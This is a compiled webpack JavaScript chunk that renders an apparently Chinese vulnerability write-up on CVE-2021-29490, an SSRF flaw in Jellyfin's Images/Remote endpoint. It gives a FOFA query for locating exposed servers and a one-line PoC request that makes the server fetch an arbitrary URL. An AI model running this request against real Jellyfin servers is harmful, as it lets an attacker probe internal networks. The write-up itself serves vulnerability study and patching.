(window.webpackJsonp=window.webpackJsonp||[]).push([[99],{1792:function(t,a,s){t.exports=s.p+"assets/img/1639026469087-918a2c7f-b015-4a28-a885-00f9a7267d75.93e2eb8a.png"},1793:function(t,a,s){t.exports=s.p+"assets/img/1639026630565-84275017-5bbf-4835-8d2f-c7eaf1aff942.9a2499a8.png"},1794:function(t,a,s){t.exports=s.p+"assets/img/1639026730098-5b7473f3-32b0-47ee-bb04-6f69c13202a0.38952738.png"},1795:function(t,a,s){t.exports=s.p+"assets/img/1639026826430-ef5e3b8a-d7cb-4957-a71d-b9af01c57c1b.9fddc39a.png"},2516:function(t,a,s){"use strict";s.r(a);var e=s(75),n=Object(e.a)({},(function(){var t=this,a=t.$createElement,e=t._self._c||a;return e("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[e("h1",{attrs:{id:"jellyfin-remoteimagecontroller-cs-ssrf漏洞-cve-2021-29490"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#jellyfin-remoteimagecontroller-cs-ssrf漏洞-cve-2021-29490"}},[t._v("#")]),t._v(" Jellyfin RemoteImageController.cs SSRF漏洞 CVE-2021-29490")]),t._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),e("p",[t._v("Jellyfin RemoteImageController.cs 文件中存在SSRF漏洞，通过构造特殊的请求，探测内网信息")]),t._v(" "),e("h2",{attrs:{id:"漏洞影响"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),e("a-checkbox",{attrs:{checked:""}},[t._v("Jellyfin < 10.7.2")]),e("br"),t._v(" "),e("h2",{attrs:{id:"网络测绘"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),e("a-checkbox",{attrs:{checked:""}},[t._v('app="Jellyfin"')]),e("br"),t._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),e("p",[t._v("在官方的更新文件中，查找到修改的文件")]),t._v(" "),e("p",[e("img",{attrs:{src:s(1792),alt:"img"}})]),t._v(" "),e("p",[t._v("官方删除了某个方法")]),t._v(" "),e("div",{staticClass:"language-go line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-go"}},[e("code",[t._v("function "),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("getDisplayUrl")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("url"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" apiClient"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        "),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" apiClient"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("getUrl")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("'Images"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("Remote'"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v(" imageUrl"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" url "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br")])]),e("p",[t._v("下载漏洞版本源码，查找该接口对应的文件")]),t._v(" "),e("p",[e("strong",[t._v("Jellyfin.Api/Controllers/RemoteImageController.cs")])]),t._v(" "),e("p",[e("img",{attrs:{src:s(1793),alt:"img"}}),t._v("其中接收的参数为 imageUrl ，后续的代码片段存在SSRF漏洞")]),t._v(" "),e("p",[e("img",{attrs:{src:s(1794),alt:"img"}})]),t._v(" "),e("p",[t._v("构造请求POC")]),t._v(" "),e("div",{staticClass:"language-go line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-go"}},[e("code",[e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("Images"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("Remote?imageUrl"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("http"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("www"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("baidu"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("com\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:s(1795),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=n.exports}}]);